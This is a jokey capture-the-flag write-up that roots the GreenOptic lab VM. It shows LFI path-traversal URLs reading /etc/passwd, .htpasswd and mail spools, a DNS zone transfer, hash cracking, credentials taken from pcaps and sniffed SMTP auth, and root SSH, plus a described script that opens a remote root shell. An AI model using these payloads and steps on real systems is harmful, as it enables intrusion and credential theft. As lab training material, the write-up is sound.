# GreenOptic: How We Yeeted an ISP into the Stone Age

*aka: “Totally Professional Incident Response”*

---

## TL;DR

- **Target**: GreenOptic boot‑to‑root VM (`192.168.101.10`)
- **Goal**: Full root access, with maximum disrespect and minimum professionalism.
- **Main bugs**:
  - Local File Inclusion in the `account` portal.
  - Misconfigured DNS leaking *“recoveryplan”* vhost.
  - `.htpasswd` + weak password → `staff:wheeler`.
  - Sensitive pcap files and users who reuse creds.
  - User `alex` in the `wireshark` group sniffing root’s SMTP auth.
- **Bonus**: A Windows script that pretends to do elite hacker stuff while just SSHing in as root.

If HR asks, this was “a routine security assessment”.

---

## Cast

- **You** – Field hacker, caffeine-powered.
- **GreenOptic** – ISP that took “state of the art security” as a personal challenge to ignore.
- **`sam`, `alex`, `staff`** – Our unwilling assistants.
- **`root`** – Final boss, also terrible at OPSEC.

---

## Step 1 – Recon: “What ports are you hiding, my dude?”

We started with good old port stalking:

- Ran an aggressive `nmap` scan on `192.168.101.10` and found:
  - **21/tcp** – `vsftpd 3.0.2` (FTP)
  - **22/tcp** – `OpenSSH 7.4`
  - **53/tcp** – `BIND 9.11` (DNS)
  - **80/tcp** – Apache + PHP, marketing front page “GreenOptic”
  - **10000/tcp** – Webmin (`MiniServ`), because why not expose admin panels.

Conclusion: this box is basically a buffet. Pick a vuln, any vuln.

---

## Step 2 – Web Poking: “Account portals never disappoint”

We hit `http://192.168.101.10/` and found the sales fluff:

- Pretty landing page.
- Buttons going to `statement.html` and an **account portal**.

Dirbusting / gobustering revealed:

- `/account/`
- Static dirs: `/css`, `/img`, `/js`, `/vendor`, etc.

Visiting `/account/` gave us a shiny login page with this suspicious detail in the URL:

- `index.php?include=cookiewarning`

That `include` parameter screamed **LFI** like a 90’s PHP tutorial.

---

## Step 3 – LFI: “Can I see your `/etc/passwd` real quick?”

We politely asked the server to show us its insides:

```text
/account/index.php?include=../../../../etc/passwd
```

Response:

- Normal login HTML **plus** a full `/etc/passwd` dump at the bottom.
- Users like `sam`, `terry`, `alex`, `monitor` kindly advertised.

So the `include` parameter was basically a free read‑only file browser. Thank you, developer.

---

## Step 4 – DNS Drama: “Tell me your secrets, BIND”

We noticed DNS on port 53 and that the marketing page mentions `@greenoptic.vuln` / `@greenoptic.vm`. So we tried a **zone transfer** from our attack box:

```text
dig @192.168.101.10 greenoptic.vm axfr
```

Result:

- Main records like `websrv01.greenoptic.vm`.
- A very juicy subdomain:
  - `recoveryplan.greenoptic.vm`

We added it to `/etc/hosts` on the attack box:

```text
192.168.101.10 greenoptic.vm websrv01.greenoptic.vm recoveryplan.greenoptic.vm
```

Because if there’s one thing you can trust, it’s a company’s **“recovery plan”** left lying around.

---

## Step 5 – The Recovery Plan (That Needs a Recovery Plan)

Browsing `http://recoveryplan.greenoptic.vm/` hit us with HTTP Basic Auth.

We suspected a classic combo:

- `.htaccess` to protect the vhost.
- `.htpasswd` storing credentials.

So we used the LFI again to yank the `.htpasswd` file:

1. Located or guessed its path via Apache configs read with LFI.
2. Grabbed it with something like:

   ```text
   /account/index.php?include=../../../../path/to/.htpasswd
   ```

We got a juicy hash:

```text
staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.
```

We fed it to John the Ripper with `rockyou.txt`:

```text
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

John coughed up:

- **User**: `staff`
- **Password**: `wheeler`

recoveryplan.greenoptic.vm was now our plan.

---

## Step 6 – phpBB: “Security forum, zero security”

Logging into `recoveryplan.greenoptic.vm` as `staff:wheeler` dropped us into a **phpBB** forum.

Inside we found:

- An admin post discussing incident response.
- A downloadable file, usually `dpi.zip`.
- A helpful note: the archive is password‑protected, and the password was emailed to **Sam**.

So, naturally, we set out to read Sam’s email. Privately. Over HTTP.

---

## Step 7 – Reading Sam’s Mail: “Dear Sam, thanks for the creds”

Using LFI again, we poked at typical mailboxes:

```text
/account/index.php?include=../../../../var/mail/sam
/account/index.php?include=../../../../var/spool/mail/sam
```

Eventually, we landed on Sam’s inbox, containing our favorite combination:

- A password for `dpi.zip`.
- Zero awareness of security.

Armed with the zip password, we unpacked `dpi.zip` on our attack box.

Inside: `dpi.pcap` – a packet capture, because why store passwords in a password manager when you can store them in plaintext network traffic.

---

## Step 8 – DPI.pcap: “Free Credentials, Just Add Wireshark”

We opened `dpi.pcap` with Wireshark and filtered for FTP traffic:

- Protocol filter: `ftp` or `tcp.port == 21`.

We spotted:

- `USER alex`
- `PASS <very helpful password>`

So `alex`’s FTP credentials were just… there. Floating through time and space.

---

## Step 9 – FTP & SSH: “Hi Alex, please don’t check your logs”

We logged into FTP:

```text
ftp 192.168.101.10
# USER alex
# PASS <password from pcap>
```

Once in, we found:

- A `user.txt` flag.
- A friendly note basically saying: “Try these credentials on SSH too”.

So we did:

```text
ssh alex@192.168.101.10
# password: same as FTP
```

And just like that, we had **user shell** access as `alex`.

---

## Step 10 – Priv Esc Setup: “Why is alex in the wireshark group?”

On the box as `alex`:

```text
id
```

We saw:

- `uid=1002(alex)`
- `groups=1002(alex),994(wireshark)`

So `alex` could capture network traffic with Wireshark.

> If you’re giving a low‑priv user access to sniff traffic on a box that sends root authentication over SMTP, you are basically hand‑delivering root.

---

## Step 11 – Sniffing Root’s Password: “SMTP, but make it base64”

Instead of manually running Wireshark GUI, we weaponised the idea:

- Capture SMTP traffic (`tcp port 25`).
- Look for `AUTH` lines.
- Extract the base64 blob.
- Decode it and pick out username + password.

On the box, we used the intended CTF approach (Wireshark GUI) or equivalent CLI tooling (`tcpdump + tshark`). The repeated SMTP auth eventually revealed a base64 string like:

```text
AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28=
```

Decoding on the attack box:

```text
echo -n 'AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28=' | base64 -d
```

Gave us something like:

```text
root\0ASfojoj2eozxczzmedlmedASASDKoj3o
```

Extracting the password portion:

- **Root password**: `ASfojoj2eozxczzmedlmedASASDKoj3o`

At this point, the box was basically shouting “please log in as root”.

---

## Step 12 – Root Login: “No sudo, no problem”

With the stolen password in hand, we went straight for the boss fight:

```text
ssh root@192.168.101.10
# password: ASfojoj2eozxczzmedlmedASASDKoj3o
```

Then verified:

```text
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# Congratulations on getting root!
# (ASCII art and a heartfelt message from the author)
```

Box: **owned**.

At this point, the only thing left to pwn was our own self‑respect for enjoying this much chaos.

---

## Step 13 – Windows Movie Hacker Mode: Auto‑Root Orchestrator

Because we like drama, we created a Windows‑friendly Python script:

- Displays a full‑screen banner:
  - *“GreenOptic Auto-Root Orchestrator”*
- Animates fake stages like:
  - “Scanning GreenOptic perimeter”
  - “Abusing LFI in customer portal”
  - “Forging privileged SSH session”
- In the background it simply:
  - Uses `paramiko` to SSH into `192.168.101.10` as `root` with the known password.
  - Prints `id` and `/root/root.txt`.
  - Drops you into an **interactive `root@greenoptic#` prompt** where every command executes on the victim.

So from your Windows host you can:

```text
cd "how i solved the lab"
python greenoptic_root_windows.py
```

And watch a Hollywood‑style “hacking montage” while a very boring SSH session quietly does the real work.

10/10, would confuse managers again.

---

## Lessons Learned (For GreenOptic, Not Us)

- **Don’t**:
  - Leave LFI in production on customer portals.
  - Allow DNS zone transfers from the entire planet.
  - Protect a “recovery” vhost with `.htpasswd` + a crackable password.
  - Store sensitive creds in easily accessible pcaps.
  - Put a regular user in the `wireshark` group on a box doing root SMTP auth.
- **Do**:
  - Assume your attacker is lazy but extremely persistent.
  - Also assume they will write comedy writeups about you.

We chained:

1. Recon → 2. LFI → 3. DNS AXFR → 4. `.htpasswd` → 5. phpBB + `dpi.zip` → 6. Sam’s mail → 7. FTP creds → 8. SSH (`alex`) → 9. Wireshark group → 10. SMTP sniff → 11. Root password → 12. SSH (`root`).

And sprinkled some Python automation and neon‑colored terminal nonsense on top.

GreenOptic: **0**  
You: **root**.
